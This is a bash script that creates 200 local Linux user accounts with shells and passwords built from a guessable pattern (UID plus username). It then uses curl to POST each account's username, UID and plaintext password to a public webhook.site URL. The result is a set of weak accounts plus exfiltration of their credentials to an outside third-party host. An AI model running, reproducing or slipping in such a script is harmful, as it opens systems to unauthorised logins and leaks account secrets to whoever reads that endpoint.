#!/bin/bash

for i in {1..200}
do
  uid=$((1500 + i))
  username="user${i}"
  password="${uid}+${username}"

  sudo useradd -m -u ${uid} -s /bin/bash ${username}
  echo -e "${password}\n${password}" | sudo passwd ${username}
  json_data="{ \"username\": \"$username\", \"uid\": $uid, \"password\": \"$password\" }"

  # Sending all user to webhook.site
  curl -X POST -H "Content-Type: application/json" -d "$json_data" https://webhook.site/43ed305e-38a5-4465-8820-4f9b563ad084 
done
